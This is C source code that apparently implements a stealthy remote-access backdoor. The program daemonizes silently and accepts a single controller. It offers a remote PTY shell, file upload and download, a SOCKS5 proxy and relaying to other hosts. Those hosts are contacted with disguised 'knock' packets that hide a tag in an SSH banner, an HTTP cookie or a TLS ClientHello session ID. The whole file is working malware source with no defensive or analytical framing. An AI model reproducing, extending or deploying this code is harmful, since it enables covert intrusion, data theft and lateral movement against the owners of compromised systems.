        /* flush data to socket */
        if (0 < lbuf_len)
        {
            len = send(remote, lbuf, lbuf_len, 0);
            if (len == -1)
            {
                debug("send() failed, %d\n", socket_errno());
            }
            else if (0 < len)
            {
                /* move data on to top of buffer */
                debug("sent %d bytes\n", len);
                lbuf_len -= len;
                if (0 < lbuf_len)
                    memcpy(lbuf, lbuf + len, lbuf_len);

                // assert(0 <= lbuf_len);
            }
        }

        /* flush data to local output */
        if (0 < rbuf_len)
        {
            len = send(local_out, rbuf, rbuf_len, 0);
            if (len == -1)
            {
                debug("output (local) failed, errno=%d\n", errno);
            }

            rbuf_len -= len;
            if (len < rbuf_len)
                memcpy(rbuf, rbuf + len, rbuf_len);

            // assert(0 <= rbuf_len);
        }
        if (f_local == 0 && f_hold_session)
        {
            debug("closing local port without disconnecting from remote\n");
            f_remote = 0;
            ///shutdown(local_out, 2);
            close(local_out);
            break;
        }

        if (f_local == 0 && !f_hold_session)
        {
            debug("closing local port, disconnecting from remote\n");
            f_remote = 0;

            shutdown(remote, 2);
            close(remote);
            break;
        }
    }

    return close_reason;
}

void _mSleep(int second)
{
    static double starttime, stoptime;
    double yet;

    starttime = (double)time(NULL);

    stoptime = starttime + second;

    while (starttime < stoptime)
    {
        starttime = (double)time(NULL);
    }

    return;
}

int ssh_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt)
{
    int ret = 0;
    int sock_fd;
    char buffer[1024 + 1];

    sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }

    ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }
	
    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    // SSH-2.0-SecureCRT_6.2.0 (build 195) SecureCRT\r\n
    // "SSH-2.0-OpenSSH_7.4\r\n"
    memset(buffer, 0, sizeof(buffer));
    snprintf(buffer, sizeof(buffer) - 1, "SSH-2.0-OpenSSH_7.4 %s\r\n", tag_txt);

    int bf_size = strlen(buffer);

    ret = _sock->send(sock_fd, buffer, bf_size);
    if (ret < 0)
    {
        return SK_ERR_send;
    }

    close(sock_fd);


    return 1;
}

int http_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt)
{
    int ret;
    char req_buf[4000];
	int w_count = 0;
	int sock_fd;

	sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }
	
	ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }
	
    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));
	

    memset(req_buf, 0, sizeof(req_buf));

    char *host_addr = inet_ntoa(dest_addr->sin_addr);

	w_count = snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "GET /index.html HTTP/1.1\r\n");
	
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Host: %s\r\n", host_addr);
	
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36\r\n");
	// xx
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n");

	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Accept-Encoding: gzip, deflate\r\n");
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Accept-Language: en-US,en;q=0.5\r\n");
	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Connection: keep-alive\r\n");

	w_count += snprintf(req_buf+ w_count, sizeof(req_buf) - 1 - w_count, "Cookie: session=%s\r\n", tag_txt);

    strcat(req_buf, "\r\n");
	
    int bf_size = strlen(req_buf);
	
    ret = _sock->send(sock_fd, req_buf, bf_size);
    if (ret < 0)
    {
        return SK_ERR_send;
    }

    close(sock_fd);
	
	return 1;
}

#define ASCII_START 32
#define ASCII_END 126
char* get_rand_str(int size) {
    int i;
	
    char *res = malloc(size + 1);
	
    for(i = 0; i < size; i++) {
        res[i] = (char) (rand()%(ASCII_END-ASCII_START))+ASCII_START;
    }
    res[i] = '\0';
	
    return res;
}

#define SSL3_VERSION                    0x0300
#define TLS1_VERSION                    0x0301
#define TLS1_1_VERSION                  0x0302
#define TLS1_2_VERSION                  0x0303
#define TLS1_3_VERSION                  0x0304
typedef struct _SSL_record 
{
    uint8_t type;
    uint8_t major;
    uint8_t minor;
    uint16_t length;
} __attribute__ ((packed)) SSL_record_t;

typedef struct _SSL_handshake 
{
    uint8_t type;    
    uint8_t length[3];
} __attribute__ ((packed)) SSL_handshake_t;

typedef struct _SSL_handshake_hello
{
    uint8_t type;
    uint8_t length[3];
	
    uint8_t major;
    uint8_t minor;

    uint32_t gmt_unix_time;
    uint8_t random_bytes[28];
	
    uint8_t session_id_length;
    uint8_t session_id[32];

    uint16_t cipher_suites_length;
    uint16_t ciphersuites[5];
	
    uint8_t comp_methods_length;
    uint8_t comp_methods[0];
} __attribute__ ((packed)) SSL_handshake_hello_t;

int pack_CHello(char *buf, const char *tag_txt)
{
	int handshake_len = 0;
	
    SSL_handshake_hello_t handshake_hello;
	
	handshake_len = sizeof(SSL_handshake_hello_t) - sizeof(SSL_handshake_t);
	
	handshake_hello.type = 1;		// CLIENT HELLO 1
	handshake_hello.length[0] = (uint8_t)((handshake_len >> 16) & 0xff);
	handshake_hello.length[1] = (uint8_t)((handshake_len >> 8) & 0xff);
	handshake_hello.length[2] = (uint8_t)(handshake_len & 0xff);
	
	// #define TLS1_2_VERSION		0x0303
	handshake_hello.major = 0x03;
	handshake_hello.minor = 0x03;
	
	time_t time_now = time(NULL);
	char *rand_str28 = get_rand_str(28);
	handshake_hello.gmt_unix_time = htonl(time_now);
	memcpy(&handshake_hello.random_bytes , rand_str28, 28);

    handshake_hello.session_id_length = sizeof(handshake_hello.session_id);
	
	// max 32
	int tag_len = strlen(tag_txt);
	char *rand_str32 = get_rand_str(32);
	memcpy(handshake_hello.session_id, rand_str32, 32 - tag_len);
	memcpy(handshake_hello.session_id + 32 - tag_len, tag_txt , tag_len);

	
	handshake_hello.cipher_suites_length = sizeof(handshake_hello.ciphersuites);
	handshake_hello.ciphersuites[0] = 0x1301;
	handshake_hello.ciphersuites[1] = 0xc030;
	handshake_hello.ciphersuites[2] = 0xc013;
	handshake_hello.ciphersuites[3] = 0x009c;
	handshake_hello.ciphersuites[4] = 0x0035;
	
    handshake_hello.comp_methods_length = sizeof(&handshake_hello.comp_methods);
	handshake_hello.comp_methods[0] = 0x00;

	
	SSL_record_t SSL_record;
	SSL_record.type = 22;			// ssl HANDSHAKE	22
	SSL_record.major = 0x03;		// #define TLS1_VERSION		0x0301
	SSL_record.minor = 0x01;
	SSL_record.length = sizeof(handshake_hello);
	
	int record_len = sizeof(SSL_record);
	
	memcpy(buf, &SSL_record, record_len);
	
	memcpy(buf + record_len, &handshake_hello, sizeof(handshake_hello));
	
	return record_len + sizeof(handshake_hello);
}

int https_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt)
{
    int ret;
	int w_count = 0;
	int sock_fd;
	char ssl_buf[512];

	sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }
	
	ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }
	
    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    memset(ssl_buf, 0, sizeof(ssl_buf));
	
	// TLSv1.2 Client Hello
	int bf_len = pack_CHello(ssl_buf, tag_txt);
	
    ret = _sock->send(sock_fd, ssl_buf, bf_len);
    if (ret < 0)
    {
        return SK_ERR_send;
    }

    close(sock_fd);
	
	return 1;
}

int start_hello(mysocks *_sock, struct sockaddr_in *dest_addr, const char *tag_txt, int type)
{
	int ret = 0;
    // http [0]/ https [1]/ ssh [2]
    if(type == 0)
	{
		ret = http_hello(_sock, dest_addr, tag_txt);
	}

    if(type == 1)
	{
		ret = https_hello(_sock, dest_addr, tag_txt);
	}
	
    if(type == 2)
	{
		ret = ssh_hello(_sock, dest_addr, tag_txt);
	}
	
	if(ret < 0)
	{
		return ret;
	}

    _mSleep(1);

    return 0;
}

int start_login(mysocks *_sock, struct sockaddr_in *dest_addr)
{
    char buffer[4000] = {0};
    int buf_len = 0;
    int sock_fd;
    int ret;

    sock_fd = _sock->socket();
    if (sock_fd < 0)
    {
        return SK_ERR_socket;
    }

    ret = _sock->connect(sock_fd, dest_addr);
    if (ret < 0)
    {
        return SK_ERR_connect;
    }

    // off nagle
    int enable = 1;
    setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));


    //  1. CMD_LOGIN
    if (sock_send(sock_fd, CMD_LOGIN, NULL, 0) < 0)
    {
        return SK_ERR_send;
    }

    memset(buffer, 0, sizeof(buffer));
    int cmd_type = 0;

    if (sock_read(sock_fd, &cmd_type, buffer, 4000) < 0)
    {
        // xxx
        //printf("recv timeout! \n");
        return SK_ERR_recv;
    }

    // 2. CMD_LOGIN_YES
    if (cmd_type != CMD_LOGIN_YES)
    {
        return -1;
    }

    return sock_fd;
}

int get_conn_info(char *conn_info, char **_addr, u_short *_port, char **password, int *type)
{
	int num;
	char addr_str[512];
	char pass_str[64];
	u_short port1;
	int type1;
	
	// ex:  ip:port+pass+type
	if(4 != sscanf(conn_info,"%255[^:]:%d+%64[^+]%d", addr_str, &port1, pass_str, &type1) ) {
		return -1;
	}

	*_addr = strdup(addr_str);
	*_port = port1;
	*password = strdup(pass_str);
	*type = type1;

    return 0;
}


int cmd_switch(mysocks *_sock, int sockfd)
{
    int nRet = 0;
    int cmd_type = 0;
    char data[4000] = {0};

    nRet = sock_read(sockfd, &cmd_type, data, 4000);
    if ( nRet < 0)
        return -1;

    if(cmd_type == CMD_LOGIN)
    {
        sock_send(sockfd, CMD_LOGIN_YES, NULL, 0);

        return 0;
    }

    if(cmd_type == CMD_DISCONNECT)
    {
        sock_send(sockfd, CMD_DISCONNECT_OK, NULL, 0);

        sleep(1);

        close(sockfd);
        debug("-- CMD_DISCONNECT_OK \n");

        exit(0);

        return 0;
    }

    if(cmd_type == CMD_CONNECT)
    {
        char *password = NULL;
        char *to_addr = NULL;
        u_short to_port = 0;
        int dest_fd;
        int len = 0;
		int type = 0;

        // ex:  ip:port+pass+type
        char conn_info[640 + 1] = {0};

        len = strlen(data);

        memcpy(conn_info, data, len);
		
		debug(" ->> %s \n", conn_info);

        if(get_conn_info(conn_info, &to_addr, &to_port, &password, &type) < 0)
            return 0;

        debug(" addr-%s:%d  pass-%s  type-%d\n", to_addr, to_port, password, type);

        // 1. connect rk
        int32_t hello_ok = 0;
        struct sockaddr_in dest_addr;

        mysocks _mysocks =
        {
            sk_init,
            sk_socket,
            sk_bind,
            sk_listen,
            sk_connect,
            sk_accept,
            sk_send_all,
            sk_recv_all
        };

        _mysocks.init(&dest_addr, to_addr, to_port);
        free(to_addr);

        hello_ok = start_hello(&_mysocks, &dest_addr, password, type);
		free(password);
		
        if (hello_ok < 0)
        {
            sock_send(sockfd, CMD_ERROR, NULL, 0);

            return 0;
        }

        dest_fd = start_login(&_mysocks, &dest_addr);
        if (dest_fd < 0)
        {
            sock_send(sockfd, CMD_ERROR, NULL, 0);

            return 0;
        }

        sock_send(sockfd, CMD_CONNECT_OK, NULL, 0);

        // 3. data forward
        tcp_forward(sockfd, sockfd, dest_fd);

        return 0;
    }


    struct _file_ctx
    {
        uint32_t    len;
        uint32_t    offset;
        uint32_t    data;
    };
    typedef struct _file_ctx FILE_CTX;

    if(cmd_type == CMD_FILE_UPLOAD)
    {
        //  CMD_FILE_UPLOAD /111/111.txt
        char loc_fileinfo[M_MAX_PATH_ + 1] = {0};

        memcpy(loc_fileinfo, data, nRet);

        if(path_check2(loc_fileinfo) < 0)
        {
            sock_send(sockfd, CMD_PATH_ERR, NULL, 0);

            return 0;
        }

        filectl _filectl =
        {
            fs_open,
            fs_close,
            fs_read,
            fs_write
        };

        // open yes ?
        FILE *fp = _filectl.open(loc_fileinfo, "wb");
        if (fp == NULL)
        {
            ///debug("  %s can not open,write \n", loc_fileinfo);

            sock_send(sockfd, CMD_FILE_CREATE_ERR, NULL, 0);

            return 0;
        }
        // _filectl.close(fp);

        sock_send(sockfd, CMD_FILE_UPLOAD_YES, NULL, 0);


        // get size
        int64_t file_size = 0;

        nRet = sock_read(sockfd, &cmd_type, (unsigned char *)&file_size, sizeof(int64_t));
        if ( nRet < 0)
            return -1;

        if(cmd_type != CMD_FILE_SIZE)
        {
            return -1;
        }

        if (file_size == 0)
        {
            return 0;
        }

        ///debug("file_size: %ld\n", file_size);

        int ret = recv_file(_sock, sockfd, fp, file_size);
        if(ret == -1)
        {
            //debug(" - error: open %s\n", loc_fileinfo);
        }
        if(ret == -2)
        {
            //debug(" - error: recv fail %s\n", loc_fileinfo);
        }
        if(ret == -2)
        {
            //debug(" - error: write fail %s\n", loc_fileinfo);
        }

        return 0;
    }

    if(cmd_type == CMD_FILE_DOWN)
    {
        // file path
        //  CMD_FILE_DOWN /111/111.txt
        char loc_fileinfo[M_MAX_PATH_ + 1] = {0};

        memcpy(loc_fileinfo, data, nRet);

        if(is_exists(loc_fileinfo) != 1)
        {
            // not exists
            sock_send(sockfd, CMD_PATH_ERR, NULL, 0);

            return 0;
        }

        if(is_dir(loc_fileinfo) == 1)
        {
            sock_send(sockfd, CMD_PATH_ERR, NULL, 0);

            return 0;
        }

        sock_send(sockfd, CMD_DOWNLOAD_YES, NULL, 0);

        int64_t file_size = get_file_size(loc_fileinfo);
        if (file_size <= 0)
        {
            sock_send(sockfd, CMD_FILE_SIZE, (unsigned char *)&file_size, sizeof(int64_t));

            return 0;
        }
        if (sock_send(sockfd, CMD_FILE_SIZE, (unsigned char *)&file_size, sizeof(int64_t)) < 0)
        {
            return SK_ERR_send;
        }

        filectl _filectl = { fs_open, fs_close, fs_read, fs_write };

        int ret = send_file(_sock, sockfd, &_filectl, loc_fileinfo);
        if(ret == 1)
        {
            ///debug(" + File: %s yes \n", loc_fileinfo);
        }
        if(ret == -1)
        {
            ///debug(" File ERR: open %s\n", loc_fileinfo);
        }
        if(ret == -2)
        {
            ///debug(" File ERR: send %s\n", loc_fileinfo);
        }

        return 1;
    }

    if(cmd_type == CMD_SHELL_PTY)
    {
        sock_send(sockfd, CMD_SHELL_YES, NULL, 0);

        pty_main(_sock, sockfd);

        //continue;
    }


    if(cmd_type == CMD_SOCKS5)
    {
        start_socks5(sockfd, data);

    }

    return 0;
}


void off_nagle(int sockfd)
{
    // off nagle
    int enable = 1;
    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));
}

int check_timeout(int sock_id, int time_sec)
{
    fd_set readfds;
    struct timeval timeout;
    int ret;

    {
        FD_ZERO(&readfds);
        FD_SET(sock_id, &readfds);

        timeout.tv_sec = time_sec;
        timeout.tv_usec = 0;

        ret = select(sock_id + 1, &readfds, NULL, NULL, &timeout);
        if (ret < 0)
        {
            return -1;
        }

        //  time out
        if (ret == 0)
        {
            return 1;
        }

    }

    return 0;
}

int main(int argc, char *argv[])
{
    int master_sk, port;
    int pid;
    fd_set readfds;
    mode_t new_umask;
    int ret;
    int l;

    if (argc == 2)
    {
        port = atoi(argv[1]);
    }
    else
    {
        port = 0;
    }

    debug(" running...\n");
    fflush(stdout);

#ifndef DEBUG
        pid = fork();
        if(pid != 0 )
        {

            return 0;
        }

        pid = open("/dev/null", O_RDWR);
        dup2(pid, 0);
        dup2(pid, 1);
        dup2(pid, 2);
        close(pid);

        if(setgroups(0, NULL) < 0)
        {
            ///debug("setgroups failed: %s ", strerror(errno));
        }
#endif


    new_umask = umask(0077) | 0022;
    (void)umask(new_umask);


    chdir("/");

    signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, sig_child);



    mysocks _mysocks =
    {
        sk_init,
        sk_socket,
        sk_bind,
        sk_listen,
        sk_connect,
        sk_accept,
        sk_send_all,
        sk_recv_all
    };

    master_sk = new_listen(&_mysocks, port);
    if (master_sk < 0)
        exit(0);


    ret = check_timeout(master_sk, 60);
    if (ret < 0)
    {
#ifdef DEBUG
        printf(" timeout ");
#endif
        exit(0);
    }
    // timeout
    if (ret == 1)
    {
        exit(0);
    }

    int new_fd;
    new_fd = _mysocks.accept(master_sk);
    if (new_fd < 0)
        exit(0);

    off_nagle(new_fd);

    // close listen
    close(master_sk);


    while (1)
    {
        int ret = cmd_switch(&_mysocks, new_fd);
        if(ret < 0)
        {
            close(new_fd);

            break;
        }

    }

    return 0;
}
